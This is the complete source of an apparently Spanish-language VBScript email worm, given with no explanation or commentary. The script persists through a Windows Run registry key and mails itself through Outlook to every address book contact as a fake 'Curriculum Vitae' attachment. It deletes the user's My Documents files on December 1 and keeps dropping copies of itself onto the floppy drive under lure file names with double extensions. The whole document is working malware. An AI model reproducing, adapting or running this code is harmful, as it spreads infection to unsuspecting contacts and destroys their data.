Dim GZNomArchi
Dim ValorRndGZ
Dim GZContar 
Dim GZContTecla 
On error resume next
abc = "WScript"
Carga = ".Shell"
Set TH = CreateObject(abc & Carga)
TH.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\TavoScript","wscript.exe C:\WINDOWS\HELP\IESRACK.vbs %"
Src1t = "Scripting"
File1Obj = ".filesystemobject"
Set GZFileSysObj = CreateObject(Src1t & File1Obj)
GZFileSysObj.copyfile wscript.scriptfullname,"C:\WINDOWS\HELP\IESRACK.vbs"
If TH.regread("HKCU\software\TavoScript\correo") <> "1" Then
OutLYoN()
End If
Function OutLYoN()
ON ERROR RESUME NEXT
Set LYoNApp = CreateObject("Outlook.Application")
If LYoNApp = "Outlook" Then
Set mLYoN = LYoNApp.GetNameSpace("MAPI")
Set mdLYoN = mLYoN.AddressLists
For Each AdlLYoN In mdLYoN
If AdlLYoN.AddressEntries.Count <> 0 Then
Set MsLYoN = LYoNApp.CreateItem(0)
MsLYoN.Subject = "Saludos"
MsLYoN.Body = "Hola:" & vbCrlf & "Aquí le adjunto mi Curriculum Vitae... Gracias." & vbCrlf & ""
MsLYoN.Attachments.add "C:\WINDOWS\HELP\IESRACK.vbs"
MsLYoN.DeleteAfterSubmit = True
For zLYoN = 1 To AdlLYoN.AddressEntries.Count
If AdlLYoN.AddressEntries.Count = 1 Then
MsLYoN.To = AdlLYoN.AddressEntries(zLYoN).Address
Else
MsLYoN.To = MsLYoN.To & "; " & AdlLYoN.AddressEntries(zLYoN).Address
End If
Next
MsLYoN.send
End If
Next
LYoNApp.Quit
TH.regwrite "HKCU\software\TavoScript\correo","1"
End If
End Function
If day(now) = 11 Then
msgbox "RackCrack nunca estuvo de parranda, solo analizaba su plan...ractil  !", vbCtrlf, "RackCrack el gran ratius"
End If
If month(now) = 12 and day(now) = 1 Then
GZFileSysObj.deletefile ("C:\misdoc~1\*.*")
End If
GZContar = 0
GZContTecla = 0
Randomize timer
Rack()
Function Rack()
On Error Resume Next
Do
ValorRndGZ = Int(Rnd * 19)
GZContTecla = GZContTecla + 1
If ValorRndGZ = 0 Then GZNomArchi = "Juego.exe"
If ValorRndGZ = 1 Then GZNomArchi = "SOLICITUD.doc"
If ValorRndGZ = 2 Then GZNomArchi = "wd19.tmp"
If ValorRndGZ = 3 Then GZNomArchi = "Sexo.jpg"
If ValorRndGZ = 4 Then GZNomArchi = "RackCrack.exe"
If ValorRndGZ = 5 Then GZNomArchi = "Sunat.xls"
If ValorRndGZ = 6 Then GzNomArchi = "Planilla General.xls"
If ValorRndGZ = 7 Then GzNomArchi = "relación.doc"
If ValorRndGZ = 8 Then GzNomArchi = "IMPORTANTE.txt"
If ValorRndGZ = 9 Then GzNomArchi = "Analisis exaustivo en el lobulo central del cerebro.doc"
If ValorRndGZ = 10 Then GzNomArchi = "Britney Spears.wav"
If ValorRndGZ = 11 Then GzNomArchi = "Caratula.cdr"
If ValorRndGZ = 12 Then GzNomArchi = "niños de 2 años.doc"
If ValorRndGZ = 13 Then GzNomArchi = "matricula de alumnos.xls"
If ValorRndGZ = 14 Then GzNomArchi = "lista de cumpleaños.doc"
If ValorRndGZ = 15 Then GzNomArchi = "Estimados señores.doc"
If ValorRndGZ = 16 Then GzNomArchi = "aviso.doc"
If ValorRndGZ = 17 Then GzNomArchi = "inventario de los.doc"
If ValorRndGZ = 18 Then GzNomArchi = "ESTADO DE CUENTAS.doc"
If GZNomArchi = "" Then GZNomArchi = "LEEME.TXT"
Delay()
GZFileSysObj.copyfile "C:\WINDOWS\HELP\IESRACK.vbs","a:\" & GZNomArchi & ".vbs"
If GZContTecla = 6 Then
If day(now) = 9 Then
TH.sendkeys " Danger!... I'm New FeLiNo GZ.LYoN "
End If
GZContTecla = 0
End If
Loop
End Function
Sub Delay()
dim Esperar
On Error Resume Next
Esperar=480 
Desde = Timer 
Do While Timer < Desde + Esperar
Loop
End Sub